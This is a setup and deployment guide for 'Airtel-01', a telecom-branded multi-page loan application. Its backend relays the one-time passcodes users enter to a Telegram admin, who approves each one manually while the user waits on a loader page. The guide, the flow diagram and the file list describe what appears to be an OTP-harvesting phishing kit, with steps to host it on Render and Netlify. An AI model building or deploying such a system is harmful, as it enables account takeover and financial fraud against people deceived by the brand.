# 🚀 Quick Start Guide - Airtel‑01 with Telegram OTP

Complete setup for the loan application with Node.js backend and Telegram bot verification.

---

## 📋 What You'll Have

```
✅ Frontend: 8 HTML pages (index → loan7)
✅ Backend: Node.js/Express server
✅ Telegram: Admin approval for OTP
✅ Deployment: Render (backend) + Netlify (frontend)
```

---

## 🔧 Local Development

### Backend Setup

```bash
cd backend
npm install

# Create .env file
cp .env.example .env

# Edit .env with your Telegram credentials
# TELEGRAM_BOT_TOKEN=your_token
# TELEGRAM_ADMIN_CHAT_ID=your_chat_id
# TELEGRAM_CALLBACK_TOKEN=secret_key

# Start server
npm start
# Backend runs on http://localhost:3000
```

### Frontend Setup

The frontend already works! Just open `index.html` in your browser.

To test with local backend:

1. Open DevTools Console
2. Run: `localStorage.setItem("backendUrl", "http://localhost:3000")`
3. Refresh page and test OTP flow

---

## 🤖 Telegram Bot Setup (5 minutes)

### Get Bot Token & Chat ID

1. **Open Telegram**
   - Search: `@BotFather`
   - Send: `/newbot`
   - Follow prompts
   - Copy: Bot Token (e.g., `123456:ABCxyz`)

2. **Get Chat ID**
   - Message your new bot anything
   - Visit: `https://api.telegram.org/bot{YOUR_TOKEN}/getUpdates`
   - Find: `"chat":{"id":XXXXXXX}`
   - Copy: Chat ID (e.g., `987654321`)

3. **Add to `.env`**
   ```env
   TELEGRAM_BOT_TOKEN=123456789:ABCDefGHijKLmNoPqRstuvWXyz
   TELEGRAM_ADMIN_CHAT_ID=987654321
   TELEGRAM_CALLBACK_TOKEN=my_super_secret_key_123
   ```

---

## 🧪 Test Locally

### Terminal 1: Start Backend

```bash
cd backend
npm start
```

### Terminal 2: Start Frontend (optional)

```bash
cd ..
# Open index.html in browser, or use:
python -m http.server 8000  # then visit http://localhost:8000
```

### Browser: Test Complete Flow

1. Open `http://localhost:8000` (or just local file)
2. Enter loan amount (e.g., $5000)
3. Click **APPLY NOW**
4. Fill all form details
5. On OTP page:
   - Enter any 5 digits (e.g., `12345`)
   - Click **SUBMIT**
6. Should show "Verifying..." screen
7. **Telegram**: Admin gets approval request
8. Click **✅ APPROVE** in Telegram
9. Frontend proceeds to next step ✅

---

## 🌐 Deploy to Production

### Step 1: Setup GitHub (for auto-deploy)

```bash
# Initialize git repo
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/YOUR_USERNAME/airtel-01.git
git push -u origin main
```

### Step 2: Deploy Backend on Render

1. Go to [render.com](https://render.com)
2. Click **New +** → **Web Service**
3. **Connect GitHub** and select your repo
4. Fill in:
   - **Name**: `airtel-01-backend`
   - **Root Directory**: `backend`
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
5. **Advanced** → **Environment Variables**:
   - Add all from your `.env` file
   - Change `BACKEND_URL=https://airtel-01.onrender.com`
6. Click **Deploy**

### Step 3: Deploy Frontend on Netlify

1. Go to [netlify.com](https://netlify.com)
2. Click **Add new site** → **Import existing project**
3. **Connect GitHub** and select your repo
4. Click **Deploy site**
5. ✅ Frontend URL: `https://your-site.netlify.app`

### Step 4: Connect Frontend to Backend

In `index.html` (after `<body>` opening tag), add:

```html
<script>
  // Set backend URL for production
  const isDevelopment = window.location.hostname === "localhost";
  const backendUrl = isDevelopment
    ? "http://localhost:3000"
    : "https://airtel-01.onrender.com"; // change to the URL for your Render service
  localStorage.setItem("backendUrl", backendUrl);
</script>
```

Or for each page that uses the backend, add:

```html
<script>
  localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
</script>
```

---

## 🔍 Testing Production

1. Visit your Netlify frontend URL
2. Complete loan form
3. Enter OTP (e.g., `12345`)
4. Submit → Should reach verification screen
5. Check Telegram for approval message
6. Click **✅ APPROVE**
7. Frontend should proceed ✅

---

## 🐛 Common Issues & Fixes

| Issue                         | Fix                                                      |
| ----------------------------- | -------------------------------------------------------- |
| OTP submission error          | Backend URL incorrect in localStorage                    |
| Bot not sending message       | Check `TELEGRAM_BOT_TOKEN` and `TELEGRAM_ADMIN_CHAT_ID`  |
| CORS error                    | Render backend needs CORS enabled (already done)         |
| Stuck on verification         | Backend might be asleep (Render free tier) - wait 30s    |
| Can't find request on approve | Check request ID matches between submit and status check |

---

## 📝 File Structure

```
airtel-01/
├── index.html              (Homepage with loan calculator)
├── loan1.html              (Step 1: Loan details)
├── loan2.html              (Step 2: Personal info)
├── loan3.html              (Step 3: Employment info)
├── loan4.html              (Step 4: Confirmation)
├── loan5.html              (Step 5: OTP verification - polls backend)
├── loan6.html              (Step 6: Verification loader - waits for Telegram approval)
├── loan7.html              (Step 7: Success)
├── loan8.html              (Optional: Additional)
├── DEPLOYMENT.md           (Full deployment guide)
├── SETUP.md                (This file)
│
└── backend/
    ├── server.js           (Main Node.js server)
    ├── package.json        (Dependencies)
    ├── .env.example        (Environment template)
    ├── .env                (Your actual secrets - NEVER COMMIT)
    └── README.md           (Backend documentation)
```

---

## 🎯 What Happens at Each Step

```
User fills loan form (index → loan1 → loan2 → loan3)
                ↓
Reaches OTP page (loan5.html)
                ↓
User enters 5-digit OTP
                ↓
Clicks SUBMIT → Frontend sends OTP to backend + shows loading
                ↓
Backend receives OTP → Notifies Telegram admin with [✅] [❌] buttons
                ↓
load6.html polls backend every 2 seconds
                ↓
Admin clicks ✅ in Telegram → Backend marks as approved
                ↓
Frontend detects approval → Redirects to loan7.html (Success!)
```

---

## 🔐 Security Notes

- **Never** commit `.env` file to GitHub
- **Always** use environment variables for secrets
- **Always** use HTTPS in production (Render/Netlify handle this)
- Add rate limiting to backend for production
- Validate all inputs on backend
- Use HTTPS for local testing with ngrok if needed

---

## 💡 Next Steps

1. ✅ Deploy backend on Render
2. ✅ Deploy frontend on Netlify
3. ✅ Get Telegram bot token & chat ID
4. ✅ Configure environment variables
5. 📋 Test complete flow
6. 🎉 Go live!

For more details, see [DEPLOYMENT.md](./DEPLOYMENT.md)

---

## 📞 Need Help?

- Backend docs: See `backend/README.md`
- Deployment: See `DEPLOYMENT.md`
- Telegram bot API: https://core.telegram.org/bots/api
- Render docs: https://render.com/docs
- Netlify docs: https://docs.netlify.com

Happy deploying! 🚀
